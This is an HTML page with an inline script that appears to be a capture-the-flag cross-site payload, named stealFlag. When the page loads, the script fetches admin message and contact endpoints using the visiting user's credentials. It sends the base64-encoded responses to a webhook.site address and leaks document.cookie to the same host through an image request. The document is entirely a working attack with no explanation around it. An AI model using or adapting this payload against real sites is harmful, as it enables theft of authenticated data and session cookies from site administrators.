<!DOCTYPE html>
<html>
<body>
    <script>
        const webh = "https://webhook.site/eea9d67e-7379-46ca-b85a-c69dad2bf391";
        const myMsgId = "69ea8fcabee6d6b7c66463f6"; 
        
        async function stealFlag() {
            // Path 1: The API endpoint for that specific message
            // Path 2: The UI page for that specific message
            const targets = [
                `/api/admin/messages/${myMsgId}`,
                `/admin/contacts/${myMsgId}`
            ];

            for (let url of targets) {
                try {
                    const r = await fetch(url, { credentials: 'include' });
                    const content = await r.text();
                    
                    // Exfiltrate the data
                    // We use btoa to keep the data clean during transmission
                    fetch(webh, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({
                            path: url,
                            data: btoa(unescape(encodeURIComponent(content)))
                        })
                    });
                } catch (e) {}
            }
            
            // Final "catch-all" to see if we can get cookies too
            new Image().src = `${webh}/cookies?val=${btoa(document.cookie)}`;
        }

        stealFlag();
    </script>
